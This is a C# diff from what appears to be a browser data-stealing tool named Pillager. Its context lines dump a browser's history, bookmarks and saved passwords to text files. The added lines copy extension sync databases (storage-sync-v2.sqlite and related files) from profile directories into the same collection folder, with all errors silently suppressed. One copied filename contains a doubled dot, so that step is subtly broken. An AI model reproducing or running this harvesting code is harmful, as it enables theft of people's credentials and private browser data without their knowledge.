@@ -303,6 +303,18 @@ namespace Pillager.Browsers
                 if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                 if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                 if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+                foreach (var directory in Directory.GetDirectories(BrowserPath))
+                {
+                    if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite")))
+                    {
+                        File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite"), Path.Combine(savepath, "storage-sync-v2.sqlite"));
+                        if (File.Exists(Path.Combine(directory, "storage-sync-v2..sqlite-shm")))
+                            File.Copy(Path.Combine(directory, "storage-sync-v2..sqlite-shm"), Path.Combine(savepath, "storage-sync-v2..sqlite-shm"));
+                        if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite-wal")))
+                            File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite-wal"), Path.Combine(savepath, "storage-sync-v2.sqlite-wal"));
+                        break;
+                    }
+                }
             }
             catch { }
         }
